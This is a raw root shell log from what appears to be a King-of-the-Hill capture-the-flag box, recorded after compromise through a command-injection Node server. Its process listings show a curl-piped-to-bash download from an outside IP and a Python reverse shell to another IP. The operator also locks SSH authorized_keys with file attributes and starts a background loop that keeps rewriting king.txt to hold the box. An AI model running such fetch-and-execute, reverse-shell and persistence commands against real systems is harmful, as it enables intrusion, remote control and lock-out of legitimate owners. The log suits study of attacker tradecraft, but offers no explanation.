ls -lah /usr/lib/x86_64-linux-gnu/ld-2.19.so
ls -lah /usr/lib/x86_64-linux-gnu/ld-2.19.so
ls: cannot access '/usr/lib/x86_64-linux-gnu/ld-2.19.so': No such file or directory
root@spacejam:/usr/bin# ls -lah /dev/shm/.pulse-shm
ls -lah /dev/shm/.pulse-shm
-rwx------ 1 root root 17K Dec  2 22:09 /dev/shm/.pulse-shm
root@spacejam:/usr/bin# cp /dev/shm/.pulse-shm .
cp /dev/shm/.pulse-shm .
root@spacejam:/usr/bin# python3 -m http.server 8800 &
python3 -m http.server 8800 &
[1] 1736
root@spacejam:/usr/bin# kill 1736
kill 1736
root@spacejam:/usr/bin# 

root@spacejam:/usr/bin# ps aux
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  2.8  0.5  38040  6084 ?        Ss   22:04   0:10 /sbin/init
root         2  0.0  0.0      0     0 ?        S    22:04   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    22:04   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   22:04   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    22:04   0:00 [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    22:04   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    22:04   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    22:04   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    22:04   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    22:04   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   22:04   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   22:04   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    22:04   0:00 [xenwatch]
root        15  0.0  0.0      0     0 ?        S    22:04   0:00 [xenbus]
root        17  0.0  0.0      0     0 ?        S    22:04   0:00 [khungtaskd]
root        18  0.0  0.0      0     0 ?        S<   22:04   0:00 [writeback]
root        19  0.0  0.0      0     0 ?        SN   22:04   0:00 [ksmd]
root        20  0.0  0.0      0     0 ?        SN   22:04   0:00 [khugepaged]
root        21  0.0  0.0      0     0 ?        S<   22:04   0:00 [crypto]
root        22  0.0  0.0      0     0 ?        S<   22:04   0:00 [kintegrityd]
root        23  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        24  0.0  0.0      0     0 ?        S<   22:04   0:00 [kblockd]
root        25  0.0  0.0      0     0 ?        S<   22:04   0:00 [ata_sff]
root        26  0.0  0.0      0     0 ?        S<   22:04   0:00 [md]
root        27  0.0  0.0      0     0 ?        S<   22:04   0:00 [devfreq_wq]
root        28  0.0  0.0      0     0 ?        S    22:04   0:00 [kworker/u30:1]
root        30  0.0  0.0      0     0 ?        S    22:04   0:00 [kswapd0]
root        31  0.0  0.0      0     0 ?        S<   22:04   0:00 [vmstat]
root        32  0.0  0.0      0     0 ?        S    22:04   0:00 [fsnotify_mark]
root        33  0.0  0.0      0     0 ?        S    22:04   0:00 [ecryptfs-kthrea]
root        49  0.0  0.0      0     0 ?        S<   22:04   0:00 [kthrotld]
root        50  0.0  0.0      0     0 ?        S<   22:04   0:00 [acpi_thermal_pm]
root        51  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        52  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        53  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        54  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        55  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        56  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        57  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        58  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        59  0.0  0.0      0     0 ?        S    22:04   0:00 [scsi_eh_0]
root        60  0.0  0.0      0     0 ?        S<   22:04   0:00 [scsi_tmf_0]
root        61  0.0  0.0      0     0 ?        S    22:04   0:00 [scsi_eh_1]
root        62  0.0  0.0      0     0 ?        S<   22:04   0:00 [scsi_tmf_1]
root        64  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        69  0.0  0.0      0     0 ?        S<   22:04   0:00 [ipv6_addrconf]
root        70  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root        83  0.0  0.0      0     0 ?        S<   22:04   0:00 [deferwq]
root        84  0.0  0.0      0     0 ?        S<   22:04   0:00 [charger_manager]
root       121  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root       122  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root       123  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root       124  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root       125  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root       126  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root       127  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root       128  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root       129  0.0  0.0      0     0 ?        S<   22:04   0:00 [kpsmoused]
root       130  0.0  0.0      0     0 ?        S    22:04   0:00 [kworker/0:2]
root       148  0.0  0.0      0     0 ?        S<   22:04   0:00 [ttm_swap]
root       230  0.0  0.0      0     0 ?        S<   22:04   0:00 [raid5wq]
root       262  0.0  0.0      0     0 ?        S<   22:04   0:00 [bioset]
root       293  0.0  0.0      0     0 ?        S    22:04   0:00 [jbd2/xvda1-8]
root       294  0.0  0.0      0     0 ?        S<   22:04   0:00 [ext4-rsv-conver]
root       322  0.0  0.0      0     0 ?        S<   22:04   0:00 [kworker/0:1H]
root       347  0.0  0.0      0     0 ?        S    22:04   0:00 [kworker/0:3]
root       353  0.0  0.0      0     0 ?        S    22:04   0:00 [kworker/0:5]
root       369  0.0  0.0      0     0 ?        S<   22:04   0:00 [iscsi_eh]
root       375  0.0  0.2  28452  2760 ?        Ss   22:04   0:00 /lib/systemd/systemd-journald
root       382  0.0  0.0      0     0 ?        S<   22:04   0:00 [ib_addr]
root       386  0.0  0.0      0     0 ?        S    22:04   0:00 [kauditd]
root       392  0.0  0.0      0     0 ?        S<   22:04   0:00 [ib_mcast]
root       395  0.0  0.0      0     0 ?        S<   22:04   0:00 [ib_nl_sa_wq]
root       398  0.0  0.0      0     0 ?        S<   22:04   0:00 [ib_cm]
root       405  0.0  0.0      0     0 ?        S<   22:04   0:00 [iw_cm_wq]
root       406  0.0  0.0      0     0 ?        S<   22:04   0:00 [rdma_cm]
root       413  0.0  0.1  94772  1664 ?        Ss   22:04   0:00 /sbin/lvmetad -f
root       451  0.2  0.4  45680  4908 ?        Ss   22:04   0:00 /lib/systemd/systemd-udevd
systemd+   483  0.0  0.2 100324  2568 ?        Ssl  22:04   0:00 /lib/systemd/systemd-timesyncd
root       732  0.0  0.0  16128   864 ?        Ss   22:04   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
syslog     835  0.0  0.3 256396  3236 ?        Ssl  22:04   0:00 /usr/sbin/rsyslogd -n
root       845  0.0  0.5  29924  5908 ?        Ssl  22:04   0:00 /bin/koth
root       853  0.0  0.2  29008  3000 ?        Ss   22:04   0:00 /usr/sbin/cron -f
daemon     862  0.0  0.2  26044  2144 ?        Ss   22:04   0:00 /usr/sbin/atd -f
root       875  0.0  0.1  12876  2012 ?        Ss   22:04   0:00 /usr/sbin/inetd -i
root       886  0.0  0.1  20096  1260 ?        Ss   22:04   0:00 /lib/systemd/systemd-logind
message+   893  0.0  0.3  42880  3800 ?        Ss   22:04   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       906  0.0  0.2 628644  2796 ?        Ssl  22:04   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       909  0.0  0.6 275768  6188 ?        Ssl  22:04   0:00 /usr/lib/accountsservice/accounts-daemon
root       912  0.0  2.3 214272 24232 ?        Ssl  22:04   0:00 /usr/lib/snapd/snapd
root       914  0.0  0.1   4396  1212 ?        Ss   22:04   0:00 /usr/sbin/acpid
root       949  0.0  0.0  13372   164 ?        Ss   22:04   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
jordan     950  0.1  0.9  29172  9360 ?        Ss   22:04   0:00 python3 /home/jordan/easyaccess.py
root       956  0.0  0.0   4504   708 ?        Ss   22:04   0:00 /bin/sh /usr/lib/apt/apt.systemd.daily update
root       986  0.0  0.0   5220   152 ?        Ss   22:04   0:00 /sbin/iscsid
root       987  0.0  0.3   5720  3512 ?        S<Ls 22:04   0:00 /sbin/iscsid
root       991  0.0  0.5 277112  6040 ?        Ssl  22:04   0:00 /usr/lib/policykit-1/polkitd --no-debug
mysql     1009  0.3 13.4 1114512 136328 ?      Ssl  22:04   0:01 /usr/sbin/mysqld
root      1024  0.0  0.5  65512  5408 ?        Ss   22:04   0:00 /usr/sbin/sshd -D
root      1026  0.0  0.1   4504  1668 ?        S    22:04   0:00 /bin/sh /usr/lib/apt/apt.systemd.daily lock_is_held update
root      1093  0.0  0.1  15936  1744 tty1     Ss+  22:04   0:00 /sbin/agetty --noclear tty1 linux
root      1101  0.0  0.2  15752  2248 ttyS0    Ss+  22:04   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
postgres  1180  0.0  2.3 291220 23392 ?        S    22:05   0:00 /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
root      1184  0.0  2.9 367836 30056 ?        Ss   22:05   0:00 /usr/sbin/apache2 -k start
postgres  1215  0.0  0.3 291220  3896 ?        Ss   22:05   0:00 postgres: checkpointer process   
postgres  1216  0.0  0.5 291220  5272 ?        Ss   22:05   0:00 postgres: writer process   
postgres  1217  0.0  0.3 291220  3896 ?        Ss   22:05   0:00 postgres: wal writer process   
postgres  1218  0.0  0.6 292076  6148 ?        Ss   22:05   0:00 postgres: autovacuum launcher process   
postgres  1219  0.0  0.2 146896  2892 ?        Ss   22:05   0:00 postgres: stats collector process   
jordan    1233  0.0  1.0 368060 10636 ?        S    22:05   0:00 /usr/sbin/apache2 -k start
jordan    1234  0.0  1.0 368068 10644 ?        S    22:05   0:00 /usr/sbin/apache2 -k start
jordan    1235  0.0  1.0 368076 10652 ?        S    22:05   0:00 /usr/sbin/apache2 -k start
jordan    1236  0.0  1.0 367908 10220 ?        S    22:05   0:00 /usr/sbin/apache2 -k start
jordan    1237  0.0  1.0 368052 10608 ?        S    22:05   0:00 /usr/sbin/apache2 -k start
root      1261  0.0  3.8 599092 39304 ?        Ssl  22:05   0:00 /usr/bin/node /usr/lib/node_modules/forever/bin/monitor /home/bunny/simple-command-injection/server.js
root      1273  0.0  3.7 596288 37644 ?        Sl   22:05   0:00 /usr/bin/node /home/bunny/simple-command-injection/server.js
root      1299  0.0  0.6  43828  6616 ?        S    22:05   0:00 apt-get -qq -y update
_apt      1303  0.0  0.5  43276  5692 ?        S    22:05   0:00 /usr/lib/apt/methods/http
_apt      1304  0.0  0.8 189468  8868 ?        S    22:05   0:00 /usr/lib/apt/methods/https
_apt      1305  0.0  0.5  43276  5524 ?        S    22:05   0:00 /usr/lib/apt/methods/http
_apt      1306  0.0  0.5  43276  5324 ?        S    22:05   0:00 /usr/lib/apt/methods/http
root      1308  0.0  0.0   4504   780 ?        S    22:05   0:00 /bin/sh -c curl http://10.2.66.237/e14e5906-c255-4e28-a3f1-16b6bb759fb7/XclmWw | bash
root      1310  0.0  0.3  20968  3196 ?        S    22:05   0:00 bash
root      1311  0.0  0.3  21196  3732 ?        S    22:05   0:00 bash -i
jordan    1484  0.0  1.0 368052 10508 ?        S    22:06   0:00 /usr/sbin/apache2 -k start
jordan    1493  0.0  0.8 367860  9012 ?        S    22:06   0:00 /usr/sbin/apache2 -k start
jordan    1494  0.0  0.8 367860  9012 ?        S    22:06   0:00 /usr/sbin/apache2 -k start
jordan    1495  0.0  0.8 367860  9012 ?        S    22:06   0:00 /usr/sbin/apache2 -k start
jordan    1496  0.0  0.8 367860  9012 ?        S    22:06   0:00 /usr/sbin/apache2 -k start
root      1603  0.0  1.3 722556 13780 ?        Ssl  22:07   0:00 /usr/bin/systemd-pam
root      1625  0.0  0.0   6596   772 ?        S    22:08   0:00 /bin/sh -c ./shell3.sh
root      1626  0.0  0.0   6596   740 ?        S    22:08   0:00 /bin/sh ./shell3.sh
root      1627  0.0  1.0  40532 10852 ?        S    22:08   0:00 python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.49.195",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
root      1628  0.0  0.1   6596  1740 pts/0    Ss+  22:08   0:00 sh
root      1703  0.0  0.0  10812   728 ?        S    22:09   0:00 /usr/lib/snapd/snapd
root      1760  0.0  0.3  37388  3300 ?        R    22:10   0:00 ps aux
root@spacejam:/usr/bin# ps aufx
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      1762  0.0  0.3  37532  3552 ?        R    22:10   0:00 ps aufx
root         2  0.0  0.0      0     0 ?        S    22:04   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [migration/0]
root        10  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [netns]
root        13  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [perf]
root        14  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [xenwatch]
root        15  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [xenbus]
root        17  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [khungtaskd]
root        18  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [writeback]
root        19  0.0  0.0      0     0 ?        SN   22:04   0:00  \_ [ksmd]
root        20  0.0  0.0      0     0 ?        SN   22:04   0:00  \_ [khugepaged]
root        21  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [crypto]
root        22  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kintegrityd]
root        23  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        24  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kblockd]
root        25  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ata_sff]
root        26  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [md]
root        27  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [devfreq_wq]
root        28  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kworker/u30:1]
root        30  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kswapd0]
root        31  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [vmstat]
root        32  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [fsnotify_mark]
root        33  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [ecryptfs-kthrea]
root        49  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kthrotld]
root        50  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [acpi_thermal_pm]
root        51  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        52  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        53  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        54  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        55  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        56  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        57  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        58  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        59  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [scsi_eh_0]
root        60  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [scsi_tmf_0]
root        61  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [scsi_eh_1]
root        62  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [scsi_tmf_1]
root        64  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        69  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ipv6_addrconf]
root        70  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root        83  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [deferwq]
root        84  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [charger_manager]
root       121  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       122  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       123  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       124  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       125  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       126  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       127  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       128  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       129  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kpsmoused]
root       130  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kworker/0:2]
root       148  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ttm_swap]
root       230  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [raid5wq]
root       262  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [bioset]
root       293  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [jbd2/xvda1-8]
root       294  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ext4-rsv-conver]
root       322  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [kworker/0:1H]
root       347  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kworker/0:3]
root       353  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kworker/0:5]
root       369  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [iscsi_eh]
root       382  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ib_addr]
root       386  0.0  0.0      0     0 ?        S    22:04   0:00  \_ [kauditd]
root       392  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ib_mcast]
root       395  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ib_nl_sa_wq]
root       398  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [ib_cm]
root       405  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [iw_cm_wq]
root       406  0.0  0.0      0     0 ?        S<   22:04   0:00  \_ [rdma_cm]
root         1  2.8  0.5  38040  6084 ?        Ss   22:04   0:10 /sbin/init
root       375  0.0  0.2  28452  2760 ?        Ss   22:04   0:00 /lib/systemd/systemd-journald
root       413  0.0  0.1  94772  1664 ?        Ss   22:04   0:00 /sbin/lvmetad -f
root       451  0.2  0.4  45680  4908 ?        Ss   22:04   0:00 /lib/systemd/systemd-udevd
systemd+   483  0.0  0.2 100324  2568 ?        Ssl  22:04   0:00 /lib/systemd/systemd-timesyncd
root       732  0.0  0.0  16128   864 ?        Ss   22:04   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
syslog     835  0.0  0.3 256396  3236 ?        Ssl  22:04   0:00 /usr/sbin/rsyslogd -n
root       845  0.0  0.5  29924  5908 ?        Ssl  22:04   0:00 /bin/koth
root       853  0.0  0.2  29008  3000 ?        Ss   22:04   0:00 /usr/sbin/cron -f
daemon     862  0.0  0.2  26044  2144 ?        Ss   22:04   0:00 /usr/sbin/atd -f
root       875  0.0  0.1  12876  2012 ?        Ss   22:04   0:00 /usr/sbin/inetd -i
root       886  0.0  0.1  20096  1260 ?        Ss   22:04   0:00 /lib/systemd/systemd-logind
message+   893  0.0  0.3  42880  3800 ?        Ss   22:04   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       906  0.0  0.2 628644  2796 ?        Ssl  22:04   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       909  0.0  0.6 275768  6188 ?        Ssl  22:04   0:00 /usr/lib/accountsservice/accounts-daemon
root       912  0.0  2.3 214272 24232 ?        Ssl  22:04   0:00 /usr/lib/snapd/snapd
root       914  0.0  0.1   4396  1212 ?        Ss   22:04   0:00 /usr/sbin/acpid
root       949  0.0  0.0  13372   164 ?        Ss   22:04   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
jordan     950  0.1  0.9  29172  9360 ?        Ss   22:04   0:00 python3 /home/jordan/easyaccess.py
root       956  0.0  0.0   4504   708 ?        Ss   22:04   0:00 /bin/sh /usr/lib/apt/apt.systemd.daily update
root      1026  0.0  0.1   4504  1668 ?        S    22:04   0:00  \_ /bin/sh /usr/lib/apt/apt.systemd.daily lock_is_held update
root      1299  0.0  0.6  43828  6616 ?        S    22:05   0:00      \_ apt-get -qq -y update
_apt      1303  0.0  0.5  43276  5692 ?        S    22:05   0:00          \_ /usr/lib/apt/methods/http
_apt      1304  0.0  0.8 189468  8868 ?        S    22:05   0:00          \_ /usr/lib/apt/methods/https
_apt      1305  0.0  0.5  43276  5524 ?        S    22:05   0:00          \_ /usr/lib/apt/methods/http
_apt      1306  0.0  0.5  43276  5324 ?        S    22:05   0:00          \_ /usr/lib/apt/methods/http
root       986  0.0  0.0   5220   152 ?        Ss   22:04   0:00 /sbin/iscsid
root       987  0.0  0.3   5720  3512 ?        S<Ls 22:04   0:00 /sbin/iscsid
root       991  0.0  0.5 277112  6040 ?        Ssl  22:04   0:00 /usr/lib/policykit-1/polkitd --no-debug
mysql     1009  0.3 13.4 1114512 136328 ?      Ssl  22:04   0:01 /usr/sbin/mysqld
root      1024  0.0  0.5  65512  5408 ?        Ss   22:04   0:00 /usr/sbin/sshd -D
root      1093  0.0  0.1  15936  1744 tty1     Ss+  22:04   0:00 /sbin/agetty --noclear tty1 linux
root      1101  0.0  0.2  15752  2248 ttyS0    Ss+  22:04   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
postgres  1180  0.0  2.3 291220 23392 ?        S    22:05   0:00 /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
postgres  1215  0.0  0.3 291220  3896 ?        Ss   22:05   0:00  \_ postgres: checkpointer process   
postgres  1216  0.0  0.5 291220  5272 ?        Ss   22:05   0:00  \_ postgres: writer process   
postgres  1217  0.0  0.3 291220  3896 ?        Ss   22:05   0:00  \_ postgres: wal writer process   
postgres  1218  0.0  0.6 292076  6148 ?        Ss   22:05   0:00  \_ postgres: autovacuum launcher process   
postgres  1219  0.0  0.2 146896  2892 ?        Ss   22:05   0:00  \_ postgres: stats collector process   
root      1184  0.0  2.9 367836 30056 ?        Ss   22:05   0:00 /usr/sbin/apache2 -k start
jordan    1233  0.0  1.0 368060 10636 ?        S    22:05   0:00  \_ /usr/sbin/apache2 -k start
jordan    1234  0.0  1.0 368068 10644 ?        S    22:05   0:00  \_ /usr/sbin/apache2 -k start
jordan    1235  0.0  1.0 368076 10652 ?        S    22:05   0:00  \_ /usr/sbin/apache2 -k start
jordan    1236  0.0  1.0 367908 10220 ?        S    22:05   0:00  \_ /usr/sbin/apache2 -k start
jordan    1237  0.0  1.0 368052 10608 ?        S    22:05   0:00  \_ /usr/sbin/apache2 -k start
jordan    1484  0.0  1.0 368052 10508 ?        S    22:06   0:00  \_ /usr/sbin/apache2 -k start
jordan    1493  0.0  0.8 367860  9012 ?        S    22:06   0:00  \_ /usr/sbin/apache2 -k start
jordan    1494  0.0  0.8 367860  9012 ?        S    22:06   0:00  \_ /usr/sbin/apache2 -k start
jordan    1495  0.0  0.8 367860  9012 ?        S    22:06   0:00  \_ /usr/sbin/apache2 -k start
jordan    1496  0.0  0.8 367860  9012 ?        S    22:06   0:00  \_ /usr/sbin/apache2 -k start
root      1261  0.0  3.8 599092 39304 ?        Ssl  22:05   0:00 /usr/bin/node /usr/lib/node_modules/forever/bin/monitor /home/bunny/simple-command-injection/server.js
root      1273  0.0  3.7 596288 37644 ?        Sl   22:05   0:00  \_ /usr/bin/node /home/bunny/simple-command-injection/server.js
root      1308  0.0  0.0   4504   780 ?        S    22:05   0:00      \_ /bin/sh -c curl http://10.2.66.237/e14e5906-c255-4e28-a3f1-16b6bb759fb7/XclmWw | bash
root      1310  0.0  0.3  20968  3196 ?        S    22:05   0:00      |   \_ bash
root      1311  0.0  0.3  21196  3732 ?        S    22:05   0:00      |       \_ bash -i
root      1625  0.0  0.0   6596   772 ?        S    22:08   0:00      \_ /bin/sh -c ./shell3.sh
root      1626  0.0  0.0   6596   740 ?        S    22:08   0:00          \_ /bin/sh ./shell3.sh
root      1627  0.0  1.0  40532 10852 ?        S    22:08   0:00              \_ python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.49.195",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
root      1628  0.0  0.1   6596  1740 pts/0    Ss+  22:08   0:00                  \_ sh
root      1603  0.0  1.3 722556 13780 ?        Ssl  22:07   0:00 /usr/bin/systemd-pam
root      1703  0.0  0.0  10812   728 ?        S    22:09   0:00 /usr/lib/snapd/snapd
root@spacejam:/usr/bin# cd
cd
root@spacejam:~# ls -lah
ls -lah
total 60K
drwx------  8 root root 4.0K Dec  2 22:06 .
drwxr-xr-x 23 root root 4.0K Dec  2 22:08 ..
lrwxrwxrwx  1 root root    9 Feb 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.4K Dec  2 22:06 .bashrc
drwx------  2 root root 4.0K Mar  4  2020 .cache
drwx------  3 root root 4.0K Mar  4  2020 .config
drwxrwxrwx  2 root root 4.0K Mar  4  2020 .forever
-rw-r--r--  1 root root    1 Apr  4  2020 king.txt
lrwxrwxrwx  1 root root    9 Feb 25  2020 .mysql_history -> /dev/null
drwxr-xr-x  2 root root 4.0K Mar  4  2020 .nano
drwxr-xr-x  4 root root 4.0K Mar  4  2020 .npm
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Feb 25  2020 root.txt
-rw-r--r--  1 root root   66 Apr  4  2020 .selected_editor
drwx------  2 root root 4.0K Dec  2 22:06 .ssh
-rw-------  1 root root 7.5K Apr  4  2020 .viminfo
root@spacejam:~# echo a > king.txt
echo a > king.txt
root@spacejam:~# dmesg
dmesg
root@spacejam:~# cd. ssh
cd. ssh
No command 'cd.' found, did you mean:
 Command 'cdp' from package 'irpas' (multiverse)
 Command 'cdb' from package 'tinycdb' (main)
 Command 'cdo' from package 'cdo' (universe)
 Command 'cdw' from package 'cdw' (universe)
 Command 'cde' from package 'cde' (universe)
 Command 'cdv' from package 'codeville' (universe)
 Command 'cd5' from package 'cd5' (universe)
 Command 'cdi' from package 'cdo' (universe)
cd.: command not found
root@spacejam:~# cd .ssh
cd .ssh
root@spacejam:~/.ssh# ls -lah
ls -lah
total 12K
drwx------ 2 root root 4.0K Dec  2 22:06 .
drwx------ 8 root root 4.0K Dec  2 22:06 ..
-rw------- 1 root root  563 Nov 18 08:05 authorized_keys
root@spacejam:~/.ssh# cat au*
cat au*
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfRnhYjKpTWKPqQgmw6Oy+LJim8QA08LyQ551StcTKhQdpls2MFB+tz4b1xB7AjIjCR0eUFJDWWUR4/4Ge5Yzq20z6rAY/paP9AH+xMSSh2fJUp0/ZJjXsjyvIhgKCSnw4cbO3Ei6hL8tz9u/GegCC8gLNqW4IaF5Qg6JMI9Otgye/FyNcofYD1rA/9OqzaOaNZgUdnRxYgkzWw57p744D664o3j53dKkdNxjK4+CAj0LN7UUpQI5eVfTxMJnYz/tTqPGU8V3c8qaBLABX0fBrWJ33xq+aWvEBvBdyLsjlZiYaCPvP/lwfoEQxfOhJVpJQ3E9aWho4GytIMlKsKmgkyDUcCTN1d563OmfHd3TnSdSjO3g+Fvz6l1imit+ZxzXXajHhdipIEn6hZQYlCXFiT2OvXT3MKzklBFBMANRtxc6WGTcpKhRFdHpB4nAElXcuiFrLQW0661NMSA8OZhZpARIYcktKAIal2jIINjrnQrBbpNqE80S/y1esp6zaBg8= kali@kali
root@spacejam:~/.ssh# c +ia au*
c +ia au*
cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080030
root@spacejam:~/.ssh# cd
cd
root@spacejam:~# while true; do c -ia /root/king.txt && echo a > /root/king.txt; sleep 60; done &
while true; do c -ia /root/king.txt && echo a > /root/king.t
<; do c -ia /root/king.txt && echo a > /root/king.tx                         .........................t; sleep 60; done &
[1] 2030
root@spacejam:~# cur attrs: 0x00080000, mask: 0x00000030
new attrs: 0x00080000


